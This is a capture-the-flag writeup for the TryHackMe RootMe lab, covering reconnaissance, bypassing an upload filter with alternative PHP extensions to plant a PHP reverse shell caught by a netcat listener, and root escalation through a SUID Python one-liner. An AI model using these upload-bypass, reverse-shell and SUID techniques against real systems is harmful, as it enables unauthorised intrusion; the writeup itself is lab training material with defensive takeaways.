---
title: "TryHackMe - RootMe"
date: 2026-02-11
draft: false
tags: ["tryhackme", "web", "file-upload", "privilege-escalation", "suid", "easy"]
categories: ["CTF Writeups"]
summary: "A beginner-friendly CTF focusing on web application exploitation through file upload bypass and SUID privilege escalation."
---

# TryHackMe - RootMe Writeup

**Difficulty**: Easy  
**Room Link**: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

## Overview

RootMe is a beginner-friendly CTF that covers fundamental penetration testing concepts including reconnaissance, file upload vulnerabilities, and Linux privilege escalation through SUID binaries.

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.10.x.x
```

**Results**:
- Port 22 (SSH) - OpenSSH
- Port 80 (HTTP) - Apache web server

### Directory Enumeration

```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Discovered Directories**:
- `/uploads` - File upload storage
- `/panel` - Upload functionality

## Initial Access

### File Upload Bypass

The `/panel` endpoint has a file upload form with client-side validation. Testing reveals:

1. Direct PHP upload is blocked
2. Extension filters can be bypassed using alternative PHP extensions

**Bypass Method**:

```bash
# Create reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php shell.php5

# Modify shell with your IP and port
nano shell.php5
```

**Alternative extensions that worked**:
- `.php5`
- `.phtml`
- `.phar`

Upload the file through `/panel` and access it at `/uploads/shell.php5`

### Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger by visiting
http://10.10.x.x/uploads/shell.php5
```

✅ **User flag obtained** at `/var/www/user.txt`

## Privilege Escalation

### SUID Binary Enumeration

```bash
find / -type f -perm -4000 2>/dev/null
```

**Interesting Finding**: `/usr/bin/python` has SUID bit set

### Python SUID Exploitation

Since Python has the SUID bit and is owned by root, we can spawn a root shell:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

This works because:
1. Python is executed with root privileges (SUID)
2. The `-p` flag preserves the effective UID
3. We spawn a bash shell that inherits root privileges

### Root Access

```bash
whoami
# root

cat /root/root.txt
```

✅ **Root flag obtained**

## Key Takeaways

1. **File Upload Validation**: Client-side validation is easily bypassed. Always check for alternative file extensions.
2. **SUID Binaries**: Regularly audit SUID binaries - scripting languages with SUID are particularly dangerous.
3. **Defense**: 
   - Implement server-side file type validation
   - Avoid setting SUID on interpreters
   - Use proper file permissions

## Tools Used

- Nmap
- Gobuster
- Netcat
- Python

---

**Completion Date**: February 2026  
**Time Spent**: ~45 minutes
